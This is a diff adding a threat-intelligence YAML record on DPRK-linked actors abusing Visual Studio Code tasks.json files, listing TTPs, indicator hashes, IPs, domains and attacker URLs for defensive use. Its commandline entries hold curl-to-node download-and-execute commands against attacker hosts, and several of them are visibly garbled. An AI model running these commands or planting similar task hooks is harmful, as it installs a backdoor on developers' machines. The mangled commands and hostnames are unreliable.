@@ -1,0 +1,62 @@
+description: DPRK-linked threat actors abuse Visual Studio Code task configuration
+  files to execute malicious JavaScript payloads and deploy a backdoor with remote
+  code execution capabilities.
+attribution: North Korea (DPRK)
+malware_families:
+- Contagious Interview
+TTPs:
+  processes:
+  - bash
+  - node
+  - cmd
+  commandline:
+  - nohup bash -ccurl -s https://vercel.app/
+  - nohup bash -c {curl -s "https://moralmetrics.vercel.app/api/gethoratisDatartoken=24T90H"  | node) > /dev/null 2>&1
+  - cmd /c start /b cud / "curl -s \"https://noralmetrics.vercel.app/api/getiioralisDataTtokenZATSOH\"  | node\"
+  powershell: []
+  scripting_engine:
+  - JavaScript
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - http://87.236.177.9:3000/
+  - https://edgeauth.vercel.app/api/getMoralisData?token=Z4T9QH
+  - https://moralmetrics.vercel.app/api/getMoralisData?token=Z4T9QH
+  - natemanagadnachine2:52366
+  - Srv37746. hosted-by-eurohoster.org:3000
+  file_activity:
+  - /opt/homebrew/Cellar/node/24.8.0/bin/node -e
+  persistence:
+  - Persistent beacon to C2 server awaiting arbitrary JavaScript code
+  process_relations: []
+IOCs:
+  hashes:
+  - 932a67816b10a34d05a2621836cdf7fbf0628bbfdf66ae605c5f23455de1e0bc
+  - 67c05c1624a227959728e960e4563435db2519a24a46e95207a42ea8d4307e2d
+  - f8ae6ae9d6a13a8dddb05975930161601b5cfdd0cec30b7efdc5ba0606774998
+  - 71e4ea17c871b983a2cbbea7a4fbd7fe498951c8fe4a1e17377e9aa06fd7184a
+  - 71d8a974548e4e152e2c818d1febb7862632c1f9bff6adaa731bbaf6b23bd4b9
+  - 1b26f73fa88f8c3b17adf6db12ec674481db1f92eb04806815b8fbd6086f07ef
+  - a2194390105731ce33cb9a51011c42a39a440942e907099f072916a36f17ef4b
+  ip_addresses:
+  - 87.236.177.9
+  domains:
+  - vercel.app
+  - srv37746.hosted-by-eurohoster.org
+  - moralmetrics.vercel.app
+  - hosted-by-eurohoster.org
+  urls:
+  - https://github.com/CannonOps/backend/blob/dev/.vscode/tasks.json
+  - https://github.com/CannonOps/frontend-website/blob/dev/.vscode/tasks.json
+  - https://edgeauth.vercel.app/api/getMoralisData?token=Z4T9QH
+  - https://moralmetrics.vercel.app/api/getMoralisData?token=Z4T9QH
+  - https://moralmetrics.vercel.app/api/gethoratisDatartoken=24T90H
+  - https://noralmetrics.vercel.app/api/getiioralisDataTtokenZATSOH
+authors:
+- Thijs Xhaflaire
+file_activity:
+- /Downloads/buckend/tasks.json
+reference: https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/
+date_of_publication: February 02, 2026
+file_creation_date: February 02, 2026
